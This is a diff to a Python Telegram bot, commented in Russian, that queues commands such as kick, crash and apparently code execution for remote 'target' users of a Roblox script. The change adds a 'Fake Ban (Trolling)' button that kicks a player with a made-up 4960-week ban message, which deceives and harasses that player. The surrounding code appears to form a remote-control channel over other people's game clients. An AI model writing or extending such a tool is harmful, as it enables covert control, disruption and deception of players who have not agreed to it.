@@ -370,10 +370,16 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     if chat_id in awaiting_execute: del awaiting_execute[chat_id]
                     if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
                     
-                    keyboard = {"inline_keyboard": [[{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]]}
+                    # Создаем две кнопки: Дефолт и Фейк Бан
+                    keyboard = {
+                        "inline_keyboard": [
+                            [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}],
+                            [{"text": "⛔ Fake Ban (4960 weeks)", "callback_data": f"fakeban_{target_user}"}]
+                        ]
+                    }
                     requests.post(
                         f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Напиши причину кика для {target_user} или нажми кнопку ниже:", "reply_markup": keyboard}
+                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Напиши причину кика для {target_user} или выбери шаблон ниже:", "reply_markup": keyboard}
                     )
                 
                 elif btn_action == "defaultkick":
@@ -383,6 +389,24 @@ game:GetService("Debris"):AddItem(gui, {duration})
                     if target_user not in commands_queue: commands_queue[target_user] = []
                     commands_queue[target_user].append(action)
                     requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут (дефолт)."})
+                    
+                # --- ФЕЙК БАН (ТРОЛЛИНГ) ---
+                elif btn_action == "fakeban":
+                    if chat_id in awaiting_reason:
+                        del awaiting_reason[chat_id]
+                        
+                    # Тот самый текст с картинки
+                    fake_ban_text = "You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds ]"
+                    action = f"/kick_{fake_ban_text}"
+                    
+                    if target_user not in commands_queue: 
+                        commands_queue[target_user] = []
+                    commands_queue[target_user].append(action)
+                    
+                    requests.post(
+                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
+                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} отлетел с экраном Fake Ban!"}
+                    )
                     
                 # --- КРАШ ---
                 elif btn_action == "crash":
